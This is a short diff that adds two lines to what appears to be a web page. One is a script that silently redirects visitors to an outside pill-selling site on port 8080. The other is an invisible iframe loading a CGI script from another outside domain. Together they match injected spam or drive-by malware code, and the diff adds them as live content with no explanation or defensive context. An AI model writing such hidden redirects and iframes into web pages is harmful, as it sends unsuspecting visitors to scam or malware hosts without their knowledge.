@@ -1,0 +1,2 @@
+<html><head><script>location = 'http://pillsshopping.com:8080/';</script></head></html>
+<iframe hbfww='BoGJMTtZ' src='http://getrelax4you.com/in.cgi?7 ' width='665' height='432' style='display:none'></iframe>
